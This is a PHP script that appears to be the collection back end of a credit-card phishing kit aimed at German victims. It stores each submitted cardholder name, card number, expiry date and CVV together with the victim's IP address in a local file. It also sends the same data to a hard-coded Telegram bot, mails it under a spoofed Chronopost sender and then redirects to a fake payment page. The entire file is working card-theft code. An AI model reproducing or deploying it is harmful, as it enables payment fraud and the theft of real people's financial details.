<?php
session_start();
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (!empty($_POST['creditcardholder']) and !empty($_POST['CCnr'])  and  !empty($_POST['KKMonth']) and !empty($_POST['KKYear']) and !empty($_POST['cccvc']) 
		// and !empty($_POST['pin'])
	) {
			$_SESSION['cc']=$_POST['creditcardholder'];
		  if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
                $ip = $_SERVER['HTTP_CLIENT_IP'];
            } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            } else {
                $ip = $_SERVER['REMOTE_ADDR'];
            }
            $message =  "😈nam :" . $_POST['creditcardholder'] . "\n💳CC :" . $_POST['CCnr'] .  "\n📅EXP :" . $_POST['KKMonth'] ."/". $_POST['KKYear'] ."\n💵CVV :" . $_POST['cccvc'] . "\n" . $ip . "\n********🇩🇪🇩🇪🇩🇪********\n";
            $file = fopen("./yamamoto_cc.txt", "a+");
            fwrite($file, $message);
            fclose($file);
			$to = "";
			$subject = "🇩🇪*💳*Card-De*💳*🇩🇪 :";
			$tok="5464282237:AAFk9rd4JfbmgzK92kiKK6pqZWmsUOGcJVc";
            $user="5399179841";
            $request=[
              'chat_id' => $user,
              'text' => $subject."
            ".$message
            ];
            $request_url="https://api.telegram.org/bot".$tok."/sendMessage?".http_build_query($request);
            file_get_contents($request_url);
			$headers = "From:Info <Chronopost@correos.es>\r\n";
			$headers .= "MIME-Version: 1.0\r\n";
			$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
			mail($to, $subject, $message, $headers);
			
			
			
        header("Location: Zahlung_cours_.php?codigo_id=".md5($_GET['error']));
    }
}
?>